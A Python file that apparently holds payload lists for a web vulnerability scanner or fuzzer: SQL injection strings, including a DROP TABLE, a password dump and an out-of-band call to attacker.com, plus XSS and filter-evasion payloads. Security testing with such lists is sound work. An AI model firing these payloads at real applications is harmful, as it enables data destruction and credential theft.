#common sql payloads
SQL_PAYLOADS = [
    # Error-based
    "' OR '1'='1",
    "1; DROP TABLE users --",
    "' UNION SELECT NULL, NULL --",
    "1' AND 1=0 UNION SELECT username, password FROM users --",
    # Boolean-based blind
    "1' AND (SELECT 1)=1 --",
    "1' AND (SELECT COUNT(*) FROM users)=1 --",
    # Time-based blind
    "1' AND SLEEP(5) --",
    "1' AND IF(1=1, SLEEP(5), 0) --",
    # Union-based
    "1' UNION SELECT version(), database() --",
    "1' UNION SELECT table_name, column_name FROM information_schema.columns --",
    # Out-of-band
    "1' AND (SELECT LOAD_FILE('\\\\attacker.com\\test')) --",
    # Filter bypass
    "1' OR '1'='1'--",
    "1' OR '1' LIKE '1' --",
    "1' OR '1'='1' /* comment */ --",
]


#common xss payloads
XSS_PAYLOADS = [
    # Reflected XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    # Stored XSS
    "<input value=\"<script>alert('XSS')</script>\">",
    "<textarea onfocus=alert('XSS')>test</textarea>",
    # DOM-based XSS
    "<a href=\"javascript:alert('XSS')\">Click</a>",
    "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
    # Self-XSS
    "<script>prompt('Enter credentials')</script>",
    "<img src=\"javascript:alert('XSS')\">",
    # Filter bypass
    "<ScrIpT>alert('XSS')</ScrIpT>",
    "\"/><script>alert('XSS')</script>",
    "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL-encoded
    "<script>eval('al'+'ert(\"XSS\")')</script>",  # Obfuscated
]